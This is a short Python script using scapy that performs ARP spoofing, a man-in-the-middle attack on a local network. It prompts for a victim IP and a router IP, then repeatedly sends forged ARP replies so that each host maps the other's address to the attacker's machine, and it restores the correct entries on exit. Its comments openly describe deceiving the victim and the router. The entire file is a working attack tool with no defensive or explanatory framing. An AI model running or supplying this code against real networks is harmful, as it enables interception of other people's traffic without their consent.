import sys

import scapy.all as scapy
import time
def get_mac(ip):
    arp_request=scapy.ARP(pdst=ip)
    broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast=broadcast/arp_request
    answered_list=scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0]
    return answered_list[0][1].hwsrc
def spoof(target_ip,source_ip):
    target_mac=get_mac(target_ip)
    #op means we have to create response not request
    #for the hwsrc it automatically assign the hacker mac address so,that we can false router and
    #victim
    packet=scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=source_ip)
    scapy.send(packet,verbose=False)
def restore(target_ip,source_ip):
    target_mac = get_mac(target_ip)
    source_mac=get_mac(source_ip)
    #here we declaring hwsrc for restore the default mac value of the router
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip,hwsrc=source_mac)
    #count is the sending 4 packets
    scapy.send(packet,count=4,verbose=False)

send_packets_count=0
victim_ip=input("enter the victim ip:")
router_ip=input("enter the router ip:")
try:
    while True:
        #telling the victim that im the router to send the request
        spoof(victim_ip,router_ip)
        #telling the router that im the victim you have to send response
        spoof(router_ip,victim_ip)
        print("\r[+]sending packets:",send_packets_count+2)
        sys.stdout.flush()
        send_packets_count+=2
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-]-------quitting-------")
    #giving the correct mac address of the router to the victim
    restore(victim_ip,router_ip)
    #giving the correct mac address of the victim to the router
    restore(router_ip,victim_ip)
